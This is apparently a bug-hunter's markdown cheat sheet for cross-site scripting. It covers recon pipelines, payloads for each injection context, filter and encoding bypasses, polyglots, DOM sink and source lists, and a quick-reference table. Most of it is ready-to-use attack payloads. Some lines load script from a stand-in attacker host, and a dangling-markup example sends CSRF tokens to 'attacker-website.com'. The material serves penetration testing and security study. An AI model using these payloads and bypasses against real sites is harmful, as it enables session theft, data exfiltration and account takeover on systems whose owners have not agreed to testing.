## 1. 🔍 Recon

#### High-level:
- **Automated** Crawler/Scanner
- **Manual** browsing + Audit
- **List** and **Grade** Input Vectors & Outputs
- **Categorize** based on Context
- Scan **JS and HTML** files for important JavaScript keywords(Sources & Sinks)
	- Automated (Burp Scanner/ZAP for sinks; gf xss | uro | Gxss | kxss pipeline). 
		- **The "Pipeline" Update:** `kxss` and `Gxss` are classic, but **DalFox** is the current industry standard for finding and confirming XSS in a pipeline
		- **The "Golden Pipeline" for 2025:** `subfinder -d target.com | httpx | waybackurls | uro | dalfox pipe`
	- **JavaScript Analysis:** Instead of just searching for sinks, suggest tools that map the flow from source to sink (like **LinkFinder** or **Gap** for Burp).
	- **JS Miner/Secret Finder:** Looking for API keys is standard, but looking for "internal" API endpoints in JS files often reveals XSS in administrative panels.

### Low-Level:
Insert a custom string into each ***URL parameter***(and every other user input) and check whether it shows up in the returned page(or future pages). Look for:
- **Form inputs** (text, hidden, search bars).
- **URL parameters** (GET, query strings).
- **HTTP Headers** (User-Agent, Referer, X-Forwarded-For).
- **Cookies** (user-controlled/reflected).
- **AJAX/API calls**.
- **Data from external sources** (third-party content).
- **File uploads** (e.g., HTML in GIF disguise for Stored XSS).
- Search for **JavaScript functions** like `innerHTML`, `outerHTML`, `document.write`, `location`, or `eval` `function` `SetTimeout` `SetInterval` .
- **Client-side libraries** that manipulate the DOM (e.g., jQuery).
- postMessage event listener -> Analyze listener function code. (postMessage-tracker extension could be used)


## 2. ⚔️ Testing

### High-level:
- Test List items top-to-bottom
- test special HTML chars and check filters for each item: `>` `'` `<` `"` `//:` `=` `;` `!--` 
- Basic payloads first --> Context-aware with bypasses
>  I test every parameter I find that is reflected not only for reflective XSS but for **blind XSS** as well. Not many researcher’s test every parameter for blind XSS, they think, “what are the chances of it executing?”. Quite high, my friend,
- A filter usually means the parameter we are testing is vulnerable to XSS, but the developer has created a filter to prevent any malicious HTML
- Testing for XSS flow: 
	- How are “non-malicious” HTML tags such as `<h2>` handled? 
	- What about incomplete tags? `<iframe src=//zseano.com/c=` 
	- How do they handle encodings such as `<%00h2`? (There are LOTS to try here, `%0d`, `%0a`, `%09` etc) 
	- Is it just a blacklist of hardcoded strings? 
	- Does </script/x> work? `<ScRipt>` etc.

### Low-level:
#### 1. HTML Contexts (Server-side rendering):
##### Text Node
- (e.g., between tags like \<p>HERE\</p>)
- Angle brackets are parsed as HTML
- Payloads insert new elements.
- Examples: 
```html
<script>alert(1)</script>
<script src=//attacker.com/test.js></script>
<script>alert(1)<!-
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<b onmouseover="alert(1)">hover me</b>
<iframe src=javascript:alert(1)></iframe>
<iframe srcdoc=&lt;svg/onload=alert(1)&gt;></iframe>
<iframe srcdoc="&lt;svg/onload=alert(1)&gt;"></iframe>
```
 Some tags need to be closed since text inside them is non-executable:
 ```html
 <style>
 <title>
 <noembed>
 <template>
 <noscript>
 <textarea>
 ```
 usually there are not easily broken and have some sort of filtration, try closing like:
 ```html
 </tag><svg onload=alert(1)>
 "></tag><svg onload=alert(1)>
 </tag>
 </tAg>
 </tag/x>
 </tag >
 </tag//>
 </tag%0a>
 </tag%0d>
 </tag%09>
 etc.
 ```
Once in an Executable context:
```html
// sp = separator 
<{tag}{sp}{eventHandler}{?sp}={?sp}alert(1){?sp}
	<img/src/onerror=alert(1)>
	
<sCriPt{sp}sRc{?sp}={?sp}URL{?sp}
	<sCripT%0aSrC/=/evil.js%0d

<A{sp}hRef{?sp}={?sp}JavaScript:alert(1){?sp}
	<a/~/href="&#74;avascript&colon;alert(1)"></a>

```
Some separators:
```
>
/
//
space
tab
LF
%0a
%0d
%09
%09%09
/~/
```

##### Attribute Value 
- (e.g., \<div id="HERE">)
- **Break out of quotes first**, then inject events or elements
- Examples: 
```html
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
'" onerror=alert(1) x="
" onfocus="alert('1')
'" autofocus onfocus=alert('1') "
```

```
"
%22
%2522
&quot;
%26quot;
%2526quot;
'
%27
%2527
&#39;
%26%2339;
%2526%252339;
```
Use when input lands inside an attribute’s value of an HTML tag but that tag can’t be terminated by greater than sign (>):
```html
onmouseover=alert(1)// 
"autofocus/onfocus=alert(1)// 
```
Use when input lands as a value of the following HTML tag attributes: **href**, **src**, **data** or **action**:
```js
javascript:alert(1) 
data:text/html,<svg onload=alert(1)>
```

#####  Event Handler Attribute 
- (e.g., \<button onclick="HERE">)
- Raw JS; handle quoting
- Examples: 
```js
alert(1)
onmouseover=alert(1)
);alert(1);//
&#39;);alert(1);//
```

>HTML attribute are HTML-decoded by the browser


#### 2. JavaScript Contexts (Inside \<script> blocks or inline JS):

#####  String Literal 
- (e.g., var x = 'HERE';)
- Escape the string, inject code.
- Examples: 
```js
';alert(1);//
";alert(1);//
\');alert(1);//
'-alert(1)-' 
'-alert(1)//
\'-alert(1)//
```
Use 1st or 2nd payloads when input lands in a script block, inside a string delimited value and inside a single logical block like function or conditional (if, else, etc). If quote is escaped with a backslash, use 3rd payload:
```js
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```
anywhere in a script block:
```html
</script><svg onload=alert(1)>
</script/x><svg onload=alert(1)>
```

#####  Code Execution Sink 
- (e.g., eval(HERE) or coercion)
- Direct JS eval; focus on syntax validity
- Examples: 
```js
alert(1)

\\"};alert(1);// (for escaping JSON-like structures)
```


#####  URL/Protocol Handler 
- (e.g., `<a href="HERE">` or JS URLs)
- Use schemes like `javascript:`
- Examples: 
```js
javascript:alert(1)
javascr%09ipt:\u0061lert(1) // URL encoding in scheme + Unicode in JS Code
javascr\tipt:\u0061lert(1) // Tab in scheme + Unicode in JS Code

%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
```
>Browsers parse Unicode in JS code, not the scheme


#### 3. DOM-Based Contexts (Client-side, post-HTML parsing; no entity decoding needed)

##### DOM Write Sinks 
- (e.g., document.write(HERE)) 
- Inject HTML-like structures
- Examples: 
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```


##### InnerHTML/OuterHTML 
- (e.g., element.innerHTML = HERE)
- Similar to HTML text, but runtime insertion
- Examples: 
```html
<svg onload=alert(1)>
<svg><animatetransform onbegin=alert(1)>
<img src=x onerror=alert(1)>
```

#### 4. Special/Edge Contexts 

##### SVG Runtime Mutation (e.g., inside \<svg> with animate) 
- Bypasses static filters via post-parse changes
- Examples: 
```html
<svg><a><animate attributeName=href values=javascript:alert(1)></animate><text x=20 y=20>Click me</text></a></svg>
```


##### Select/Option Elements 
- (e.g., document.write('\<option>HERE\</option>')) 
- Close and inject.
- Examples: 
 ```html
 </option><img src=x onerror=alert(1)>
 123</option></select><img src=x onerror=alert(1337)>
 ```


##### Iframe/Hash Events (e.g., DOM via location.hash): Trigger on hash change.
- Examples: 
Payloads tied to `onhashchange=alert(1)`



### Filtering & Bypass Techniques
- Split payloads
- URL/double-encode
- Uppercase/Lowercase (ScRiPt)
- comments (/\* /) within payloads
- benign chars
- frontend filters ≠ backend filters
- Different HTTP Methods
- Remove the URL method `//:attacker.com/script.js`
- Alternative encodings (Unicode, hex, base64) to bypass simplistic filters: `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`
- Fragmented Payloads `<scr<script>ipt>alert('1')</scr<script>ipt>`
- for .replace() -> `<><img src=x onerror=alert(1)`
- Fuzz for allowed tags/handlers
- Bypass escaping by increasing the number of escaping char like `\\\` or `\\\\`
- Understand the order of filters/escapes
- If it's reflected as `&lt;` or `%3C` then test for double encoding `%253C` and `%26lt;` to see how it handles those types of encoding
- Broken tags to bypass client-side filters: `<script` or `<script>alert(1)`
- **Malformed Tags**(to bypass filtration *before* DOM parsing): HTML fixes these tags. 
  ```html
  \<a onmouseover="alert(1)"\>xxs\</a\> 
  \<a onmouseover=alert(1)\>xxs\</a\>
  <IMG """><SCRIPT>alert("1")</SCRIPT>"\>
  ``` 
- Are they only looking for complete valid HTML tags? If so, we can bypass with `<script src=//mysite.com?c=` - If we don't end the script tag the HTML is instead appended as a parameter value. 
- `<%00iframe`
- `on%0derror`
- Unicode encode:
  ```js
  \u0061lert(1) // alert(1), substituting the "a" 
  a\u006cert(1) // alert(1), substituting the "l"
  \u0061\u006c\u0065\u0072\u0074(1) // alert(1), substituting all characters
  ```
- polyglots (e.g. for:
	- `"`tag attributes 
	- `'`tag attributes 
	- unquoted tag attributes
	- HTML comments
	- HTML tags
	- JavaScript `'` strings
```js
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//ض</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=a lert()//>\x3e
  
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCk=alert() ) //%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!> \x3csVg/<sVg/oNloAd=alert()//>\x3e`
  
  javascript:"/*\"/*`/*' /*</template> </textarea></noembed></noscript></title> </style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

- use `String.fromCharCode()` if special HTML chars are filtered:
```HTML
<script> 
function ascii(c){ 
	return c.charCodeAt(); 
}  
encoded = "INPUT_STRING".split("").map(ascii);  
document.write(encoded); 
</script>
```

- **SVG animations can dynamically set attributes at runtime**, This bypasses _static_ filtering completely:
	```html
	<svg>
		<a>
			<animate attributeName=href values=javascript:alert(1) />
			<text x=20 y=20>Click me</text>
		</a>
	</svg>
	```
When the SVG loads:
	 `<animate>` **writes to the `href` attribute**
	 This happens **after parsing**
	 This happens **inside the browser**, not the server
> “Treat SVG as script.”
> **If static attributes are filtered, look for a runtime write primitive.**
> **SVG animations can dynamically set attributes at runtime**

### Sinks and Sources:
Generally, the source is a DOM object capable of storing text, 
and the sink is a DOM API capable of executing a script stored as text.

- Testing for Sinks:
    ~ HTML Sinks -- Easy
        1. Send MD5 sum through the source
        2. Search HTML in Dev Tools for MD5 sum (Ctrl + F)
        3. Refine payload to deliver attack
    ~ JavaScript Execution Sinks -- Hard
        4. Search JavaScript code for any sources being referenced (Ctrl + Shift + F)
        5. Add breakpoints and manually follow how the source's value is being used
        6. If source's value is assigned to a variable, search for how that variable is used
        7. If that variable is passed to a sink, hover over the variable to show it's value before it's passed to the sink
        8. Refine payload to deliver attack


non-comprehensive list of sinks:
```JS
eval()
<script>
javascript://
document.write()
document.writeln()
document.domain()
element.innerHTML
element.outerHTML
Function()
setTimeout()
setInterval()
execScript()
ScriptElement.src
document.location
range.createContextualFragment

someDOMElement.innerHTML //Works with <img> or <iframe>
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent
add()
after()
append()
animate()
attr() //Works with HTML tags that can use the href attribute
        //~ Example: Set return URL to javascript:alert('XSS')
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()

```

non-comprehensive list of sources:
```js
document.url
document.cookie
document.documentURI
document.baseURI
document.URLEncoded
document.referrer
window.location.search
window.location.hash
window.location.cookie
window.location.pathname
window.location.href
window.name
window.indexedDB
history.pushState
history.replaceState
location
localStorage
sessionStorage
```

> [!WARNING] **Key Reminders**
> Static filtering ≠ runtime safety
> Parsing ≠ execution
> SVG ≠ HTML
> Browsers automatically **HTML-decode** the **attributes**
> Browsers parse the **Unicode** in **JavaScript**
> Browsers **won't parse** HTML tags if encoded *?*

> [!NOTE] Tips
 >- Test Everything: Always keep hacking!
> - Vulnerabilities can exist on ANY form value
> - Always use an HTML proxy when testing: Submit legit values via the browser and then modify them with proxy to executable JavaScript.
> - XSS occurs at the time of Rendering
> - Test unexpected values: Get out of the box!
> - Always confirm the biggest impact

### Content Security Policy (CSP)
##### Common CSP Controls:
- Content-Security-Policy Header:
	~ script-src 'self' -- Only scripts from the same origin domain can be loaded
	~ script-src https://scripts.normal-website.com -- Only scripts from a specific domain can be loaded
- Nonce (random value):
	~ Same value must be used in the script tag, otherwise the script won't execute
	~ Must be securely generated each time the page loads
	~ Must not be guessable
- Hash (hash value of script being loaded)
	~ Script will not load if it is changed since the hash will no longer match

- Most CSPs don't block <img> tags 
- Dangling Markup Injection can be used to bypass CSP
    ~ Inject HTML tags with open attr quotes so sensitive data (CSRF Token) is sent to attacker's server
    Step 1: Identify name of input field to exploit
    Step 2: Add GET parameter in URL with corresponding name
    Step 3: Value of malicious parameter will be the payload
    **IMPORTANT NOTES**
    - Send request through Repeater, then "Show Response in Browser"
    - Single vs Double quote is VERY important.  Double quote will end on next double quote and vice-versa
    EX:
```html
<input type="text" name="input" value="[PAYLOAD]"/>
[PAYLOAD] = "><img src='//attacker-website.com?
```
Resulting HTML:
```html
<input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>
```




---
## **3. 🛠️ Tools**
- **Automated scanners**:
	- XSStrike
	- XSSer
	- Pipeline:
		- `echo URL | gau | gf xss | uro | Gxss | kxss | tee output.txt`
	- Loxs
- **Manual**:
	- Browser Dev-Tools (search sinks: eval/innerHTML/outerHTML/document.write/location)
	- DOM Invader
- **Payloads/Encoder**:
	- PayloadsAllTheThings
	- PCE (65 charset)
	- Hackvertor (JS Obfuscation)
- **Advanced:**
	- XSS-Proxy/BeEF (Exploit frameworks)
	- ratproxy (passive audit)
	- XSS Hunter (OOB detection)
	- XSS Assistant (Greasemonkey for testing)
- **Resources:**
	- OWASP XSS Cheat-Sheet
	- OWASP [[XSS Filter Evasion]]
	- PortSwigger Cheat-Sheet
	- DomGoat (sinks)
	- Encoded payloads/Cheat Sheet: https://d3adend.org/xss/ghettoBypass



# Quick-reference table

| Context                                      | Example                                   | Go-To Payloads                                                                                                                                                                                                                          | Bypass Notes                                                                                                                                                                                                                                                              |
| -------------------------------------------- | ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HTML Text Node**                           | `<p>HERE</p>`                             | `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<b onmouseover=alert(1)>hover me</b>`, `<iframe src=javascript:alert(document.cookie)></iframe>`, `<script src=//attacker.com/test.js></script>` | For non-executable tags (e.g., `<style>`, `<title>`, `<textarea>`), close them first: `</style><svg onload=alert(1)>`, `</title><svg onload=alert(1)>`. Use malformed closers: `</tag/x>`, `</tAg>`, `</tag%0a>`, `</tag%0d>`, `</tag%09>`.                               |
| **HTML Attribute Value**                     | `<div id="HERE">`                         | `"><img src=x onerror=alert(1)>`, `'" onerror=alert(1) x="`, `"><svg onload=alert(1)>`, `" onfocus=alert(1)`, `'" autofocus onfocus=alert(1) "`, `"autofocus/onfocus=alert(1)//`                                                        | Encode quotes: `%22`, `%2522`, `&quot;`, `%26quot;`, `%2526quot;`, `'`, `%27`, `%2527`, `&#39;`, `%26%2339;`, `%2526%252339;`. If > blocked: `onmouseover=alert(1)//`. Browsers HTML-decode attributes.                                                                   |
| **HTML Event Handler Attribute**             | `<button onclick="HERE">`                 | `alert(1)`, `onmouseover=alert(1)`, `);alert(1);//`, `&#39;);alert(1);//`                                                                                                                                                               | Case variations: `OnMoUsEoVeR=alert(1)`. Add comments: `/*comment*/alert(1)`. Use Unicode: `\u0061lert(1)`.                                                                                                                                                               |
| **JavaScript String Literal**                | `var x = 'HERE';`                         | `';alert(1);//`, `";alert(1);//`, `\');alert(1);//`, `'-alert(1)-'`, `'-alert(1)//`, `\'-alert(1)//`                                                                                                                                    | If quotes escaped: `\'}alert(1);{//`, `'}alert(1)%0A{'`. Anywhere in script: `</script><svg onload=alert(1)>`, `</script/x><svg onload=alert(1)>`.                                                                                                                        |
| **JavaScript Code Execution Sink**           | `eval(HERE)`                              | `alert(1)`, `\\"};alert(1);//` (for JSON escapes)                                                                                                                                                                                       | Use coercion tricks: `,x=x=>{throw/*comment*/onerror=alert,1},toString=x,window+'',{x:''}`. Polyglots for multi-context: `jaVasCript:/*-/*\`/_'/_"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`. |
| **JavaScript URL/Protocol Handler**          | `<a href="HERE">`                         | `javascript:alert(1)`, `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`, `javascr%09ipt:\u0061lert(1)`, `javascr\tipt:\u0061lert(1)`                                                                                        | Encode scheme: `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`. Browsers parse Unicode in JS code, not scheme.                                                                                                                                                          |
| **DOM Write Sink**                           | `document.write(HERE)`                    | `"><script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`                                                                                                                                                                         | From labs: For select element: `</option><img src=x onerror=alert(1)>`. Use inside option: `trVeH9y"><script>alert(1)</script>`.                                                                                                                                          |
| **DOM InnerHTML/OuterHTML**                  | `element.innerHTML = HERE`                | `<svg onload=alert(1)>`, `<svg><animatetransform onbegin=alert(1)>`, `<img src=x onerror=alert(1)>`                                                                                                                                     | Replace() bypass: `<><img src=x onerror=alert(1)>` (replaces only first occurrence).                                                                                                                                                                                      |
| **DOM jQuery/Attribute Sink**                | `.attr("href", HERE)`                     | `javascript:alert(1)`, `onerror=alert(1)`                                                                                                                                                                                               | For AngularJS: `{{$on.constructor('alert(1)')()}}`. Sandbox bypass via constructor.                                                                                                                                                                                       |
| **DOM Framework-Specific (e.g., AngularJS)** | `ng-app` with HERE                        | `{{$on.constructor('alert(1)')()}}`                                                                                                                                                                                                     | Use for globals access in sandboxes.                                                                                                                                                                                                                                      |
| **CSS/Style Attribute**                      | `style="HERE"`                            | `expression(alert(1))` (IE only), `background:url(javascript:alert(1))`                                                                                                                                                                 | Limited; focus on imports or expressions. Negligible in modern browsers.                                                                                                                                                                                                  |
| **CSS Block**                                | `<style>HERE</style>`                     | `@import url(javascript:alert(1));`                                                                                                                                                                                                     | Rare execution; use for UI attacks or data exfil.                                                                                                                                                                                                                         |
| **SVG Runtime Mutation**                     | Inside `<svg>` with animate               | `<svg><a><animate attributeName=href values=javascript:alert(1)></animate><text x=20 y=20>Click me</text></a></svg>`                                                                                                                    | Powerful for runtime writes: Use `<animate>`, `<set>`, or `<animateTransform>`. Treat SVG as script.                                                                                                                                                                      |
| **Select/Option Element**                    | `document.write('<option>HERE</option>')` | `</option><img src=x onerror=alert(1)>`, `123</option></select><img src=x onerror=alert(1337)>`                                                                                                                                         | Malformed: `<option` without close.                                                                                                                                                                                                                                       |
| **Iframe/Hash Event**                        | DOM via `location.hash`                   | Payloads with `onhashchange=alert(1)`                                                                                                                                                                                                   | Use for persistent DOM XSS via URL fragments.                                                                                                                                                                                                                             |
